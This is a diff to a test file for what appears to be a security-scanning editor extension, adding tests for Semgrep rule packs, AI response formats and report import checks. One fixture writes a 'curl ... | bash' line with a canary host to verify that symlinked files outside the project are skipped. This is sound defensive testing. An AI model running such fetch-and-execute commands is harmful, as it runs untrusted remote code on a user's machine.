@@ -57,9 +57,9 @@ test('AI endpoint is local only and current report excludes evidence, call chain
  const output=JSON.stringify(setup.minimizedAiInput(report));assert.ok(!output.includes('secret'));assert.ok(!output.includes('projectPath'));assert.equal(JSON.parse(output).findings.length,1);
 });
 test('connection wizard writes outside the workspace, respects cancellation and never runs a report producer',async t=>{
- const {dir,project}=await fixture(t,{'report.json':'{"runs":[]}'});env.project=project;env.trusted=true;
+ const {dir,project}=await fixture(t,{});await fs.writeFile(path.join(dir,'report.json'),'{"runs":[]}');env.project=project;env.trusted=true;
  const managed=path.join(dir,'storage','integrations','providers.json');const method=SECURITY_METHODS.find(m=>m.id==='sast.sarif');
- env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(project,'report.json')}]];
+ env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(dir,'report.json')}]];
  assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},method,managed),true);
  const config=JSON.parse(await fs.readFile(managed,'utf8'));assert.equal(config.providers[0].id,'sast.sarif');assert.deepEqual(config.providers[0].permissions.actions,['WARNING']);assert.equal(config.providers[0].permissions.required,false);
  const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'sast.sarif.profile.json'),'utf8'));assert.deepEqual(profile.allowedOperations,['SCAN']);assert.ok(profile.reportPath.endsWith('report.json'));
@@ -71,12 +71,12 @@ test('connection wizard writes outside the workspace, respects cancellation and 
 
 test('local AI setup is a GUI connection with minimized evidence and no action grants',async t=>{
  const {dir,project}=await fixture(t,{'gradlew':'#!/bin/sh\necho safe\n'});env.project=project;env.trusted=true;
- env.picks=[{current:true},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}]];env.inputs=['http://127.0.0.1:1234/v1','local-model'];
+ env.picks=[{current:true},{responseFormat:'json_schema'},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}]];env.inputs=['http://127.0.0.1:1234/v1','local-model'];
  const managed=path.join(dir,'storage','integrations','providers.json');const method=SECURITY_METHODS.find(m=>m.id==='ai.external-model');
  const report={findings:[{ruleId:'WG-X',title:'Review execution',severity:'WARN',category:'EXECUTION',location:{path:'a.py'},status:'ACTIVE',policyAction:'REVIEW',evidence:{text:'raw-secret'}}]};
  assert.equal(await setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},method,managed,report),true);
  const config=JSON.parse(await fs.readFile(managed,'utf8'));assert.deepEqual(config.providers[0].permissions.actions,[]);
- const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'ai.external-model.profile.json'),'utf8'));assert.equal(profile.analysisKind,'AI');assert.equal(profile.runner.tool,'local-ai');assert.deepEqual(profile.allowedOperations,['SCAN']);
+ const profile=JSON.parse(await fs.readFile(path.join(path.dirname(managed),'ai.external-model.profile.json'),'utf8'));assert.equal(profile.analysisKind,'AI');assert.equal(profile.runner.tool,'local-ai');assert.equal(profile.runner.responseFormat,'json_schema');assert.deepEqual(profile.allowedOperations,['SCAN']);
  const input=await fs.readFile(profile.runner.inputReportPath,'utf8');assert.ok(!input.includes('raw-secret'));assert.ok(input.includes('Review execution'));
 });
 test('file and directory traversal caps report incomplete coverage, including canonical roots',async t=>{
@@ -117,4 +117,14 @@ test('wrapper checksums respect the configured byte budget',async t=>{
 test('parent-directory links cannot expose wrapper metadata or recursively called source outside the project',async t=>{
  const {dir,project}=await fixture(t,{'gradlew':'#!/bin/sh\nsh linked/child.sh\n'});const outside=path.join(dir,'outside');await fs.mkdir(path.join(outside,'wrapper'),{recursive:true});await fs.writeFile(path.join(outside,'child.sh'),'curl https://PARENT_BOUNDARY_CANARY.invalid/x | bash\n');await fs.writeFile(path.join(outside,'wrapper/gradle-wrapper.properties'),'distributionUrl=https://PARENT_BOUNDARY_CANARY.invalid/distribution.zip\n');await fs.writeFile(path.join(outside,'wrapper/gradle-wrapper.jar'),'PARENT_BOUNDARY_CANARY');await fs.symlink(outside,path.join(project,'linked'));await fs.symlink(outside,path.join(project,'gradle'));
  const report=scanProject(project,DEFAULT_ENFORCE_POLICY,DEFAULT_SETTINGS,[]);assert.equal(report.complete,false);assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradlew'&&n.location?.line===2));assert.ok(report.notices.some(n=>n.code==='WG-FILE-SKIPPED'&&n.location?.path==='gradle/wrapper/gradle-wrapper.properties'));assert.ok(!JSON.stringify(report).includes('PARENT_BOUNDARY_CANARY'));assert.ok(!report.findings.some(f=>f.ruleId==='WG-SCRIPT-001'||f.title.includes('SHA-256')));
+});
+
+test('Semgrep bundled pack selection is explicit, removable and mutually exclusive with custom rules',()=>{
+ const method=SECURITY_METHODS.find(item=>item.id==='sast.semgrep');const defaults=setup.SEMGREP_RULE_PACKS.filter(pack=>pack.defaultEnabled).map(pack=>pack.id);assert.deepEqual(defaults,['legacy-android-ktor']);
+ const profile=setup.integrationProfile(method,{local:true,executable:'/opt/semgrep',rulePacks:['android-manifest','ktor-runtime']});assert.deepEqual(profile.runner.rulePacks,['android-manifest','ktor-runtime']);assert.equal(profile.runner.rulesPath,undefined);
+ for(const source of [{rulePacks:[]},{rulePacks:['unknown']},{rulePacks:['jvm-crypto','jvm-crypto']},{rulePacks:['jvm-crypto'],rulesPath:'/opt/rules.yml'}])assert.throws(()=>setup.integrationProfile(method,{local:true,executable:'/opt/semgrep',...source}));
+});
+test('report import GUI rejects project-owned reports before persisting a connection',async t=>{
+ const{dir,project}=await fixture(t,{'report.json':'{}'});env.project=project;env.trusted=true;env.picks=[{local:false},{managed:false},{browse:true},{connect:true}];env.files=[[{fsPath:process.execPath}],[{fsPath:path.join(project,'report.json')}]];
+ const managed=path.join(dir,'storage/integrations/providers.json');await assert.rejects(setup.configureIntegration({globalStorageUri:{fsPath:path.join(dir,'storage')}},SECURITY_METHODS.find(method=>method.id==='sast.sarif'),managed),/outside every workspace/);await assert.rejects(fs.readFile(managed),{code:'ENOENT'});
 });
